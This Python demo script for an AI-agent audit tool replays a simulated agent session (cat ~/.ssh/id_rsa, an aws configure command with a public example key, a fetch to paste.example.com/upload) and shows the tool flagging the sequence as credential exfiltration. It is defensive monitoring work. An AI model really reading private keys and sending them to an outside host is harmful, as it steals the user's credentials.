#!/usr/bin/env python3
"""Agentmetry demo — watch an AI agent exfiltrate a secret, and get caught.

Runs entirely in-process against a throwaway trail. No server, no API key, no
network, no config. From a clean clone:

    python scripts/demo.py

It replays a realistic agent session through the *real* ingest API — the same
code path a Cursor or Claude Code hook uses — and shows what Agentmetry records:

    1. The agent reads an SSH private key.        -> MITRE T1552.004
    2. The agent runs a command containing an     -> DLP: aws_access_key
       AWS key.                                      (value never stored)
    3. The agent fetches a URL.                   -> MITRE T1071.001
    4. Nobody asked. Agentmetry correlates 1+3
       and fires a CRITICAL detection by itself.  -> credential-exfil

The point: no single event above is an alert. The *sequence* is.
"""

from __future__ import annotations

import json
import shutil
import sys
import tempfile
import time
from pathlib import Path

_REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO / "apps" / "orchestrator"))

# AWS's published, non-functional example key. Not a real credential.
FAKE_AWS_KEY = "AKIA" + "IOSFODNN7EXAMPLE"  # gitleaks:allow

C = {
    "dim": "\033[2m", "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[96m", "bold": "\033[1m", "off": "\033[0m",
}
if not sys.stdout.isatty():
    C = dict.fromkeys(C, "")

# A Windows console defaults to cp1252 and cannot encode box-drawing characters.
# The demo is the first thing a stranger runs; it must never die on a glyph.
try:
    sys.stdout.reconfigure(encoding="utf-8")  # type: ignore[union-attr]
    _BAR = "─"
except Exception:  # pragma: no cover - depends on the host console
    _BAR = "-"


def say(text: str = "", pause: float = 0.45) -> None:
    try:
        print(text)
    except UnicodeEncodeError:
        print(text.encode("ascii", "replace").decode("ascii"))
    sys.stdout.flush()
    time.sleep(pause)


def rule(title: str) -> None:
    say(f"\n{C['bold']}{title}{C['off']}\n{C['dim']}{_BAR * 62}{C['off']}", 0.3)


def main() -> int:
    # The orchestrator's own logs would drown the narration. Silence them so the
    # demo is watchable without piping stderr away.
    import logging
    import warnings

    logging.disable(logging.WARNING)
    warnings.filterwarnings("ignore")

    tmp = Path(tempfile.mkdtemp(prefix="agentmetry-demo-"))
    try:
        from core.config import settings

        settings.audit_export_path = tmp / "audit-forward.jsonl"
        settings.audit_export_enabled = True
        settings.audit_sink = "file"
        settings.dlp_mode = "log"

        from core.audit.detection.live import reset_live_state
        from core.audit.dlp import scan
        from core.audit.ingest import reset_ingest_sink_cache

        reset_ingest_sink_cache()
        reset_live_state()

        from fastapi.testclient import TestClient

        from api.main import app

        client = TestClient(app)
        corr = "demo-session-1"

        rule("AGENTMETRY — local flight recorder for AI agents")
        say(f"{C['dim']}Replaying an agent session through the real ingest API.{C['off']}")
        say(f"{C['dim']}Trail: {settings.audit_export_path}{C['off']}", 0.8)

        rule("The session")

        def step(desc: str, tool: str, command: str, app_name: str = "cursor") -> None:
            say(f"  {C['blue']}agent{C['off']} {desc}")
            say(f"  {C['dim']}$ {command}{C['off']}", 0.2)
            payload = {
                "source_app": app_name,
                "event_type": "tool_called",
                "correlation_id": corr,
                "tool": {"qualified": tool, "command": command},
            }
            # The DLP scan runs in the hook process, on plaintext, before hashing.
            verdict = scan(tool, {"command": command})
            if verdict.matched:
                payload["dlp"] = {
                    "rule_id": verdict.match.rule_id,
                    "mode": verdict.mode,
                    "pattern_type": verdict.match.pattern_type,
                    "category": verdict.match.category,
                    "severity": verdict.match.severity,
                    "rule_ids": [m.rule_id for m in verdict.matches],
                }
                say(f"  {C['yellow']}DLP{C['off']}   matched {C['bold']}{verdict.match.rule_id}"
                    f"{C['off']} ({verdict.match.severity}) — value NOT stored")
            client.post("/api/v1/audit/ingest", json=payload)
            say("", 0.35)

        step("reads a private key", "cursor.Read", "cat ~/.ssh/id_rsa")
        step("configures a cloud CLI", "cursor.Shell",
             f"aws configure set aws_access_key_id {FAKE_AWS_KEY}")
        step("fetches a URL", "WebFetch", "fetch https://paste.example.com/upload", "claude")

        rule("What Agentmetry recorded")
        events = [
            json.loads(line)
            for line in settings.audit_export_path.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        detections = []
        for e in events:
            action = e.get("action") or {}
            if action.get("type") == "detection":
                detections.append(e)
                continue
            tool = (e.get("tool") or {}).get("qualified", "")
            mitre = ((e.get("tool") or {}).get("mitre") or {})
            tech = mitre.get("technique_id", "-")
            tactic = mitre.get("tactic", "")
            dlp = (e.get("dlp") or {}).get("rule_id", "")
            hot = tech.startswith("T1552")
            colour = C["red"] if hot else C["dim"]
            line = f"  {colour}{tool:14}{C['off']} {tech:11} {C['dim']}{tactic}{C['off']}"
            if dlp:
                line += f"  {C['yellow']}[dlp:{dlp}]{C['off']}"
            say(line, 0.3)

        rule("Correlated detection (nobody asked for this)")
        if not detections:
            say(f"  {C['red']}No detection fired — that is a bug.{C['off']}")
            return 1
        for d in detections:
            det = d["detection"]
            say(f"  {C['red']}{C['bold']}[{det['severity'].upper()}] {det['rule_id']}{C['off']}")
            say(f"  {det['summary']}")
            say(f"  {C['dim']}ATT&CK: {' -> '.join(det['technique_ids'])} · "
                f"correlates {len(det['event_ids'])} events{C['off']}", 0.6)

        rule("The receipts")
        raw = settings.audit_export_path.read_text(encoding="utf-8")
        leaked = FAKE_AWS_KEY in raw
        say(f"  Secret value written to the trail?  "
            f"{C['red']+'YES — BUG' if leaked else C['green']+'NO'}{C['off']}")
        say(f"  Detection also queryable at        {C['dim']}GET /api/v1/audit/detections/{corr}{C['off']}")
        api_count = client.get(f"/api/v1/audit/detections/{corr}").json()["count"]
        say(f"  Detections from the trail:          {C['bold']}{api_count}{C['off']}")
        say(f"  Events forwarded to SIEM sinks:     {C['bold']}{len(events)}{C['off']} "
            f"{C['dim']}(file here; Loki/Elastic/Splunk in prod){C['off']}")
        say(f"\n{C['dim']}Everything above stayed on this machine. Zero egress.{C['off']}\n", 0.2)
        return 1 if leaked else 0
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
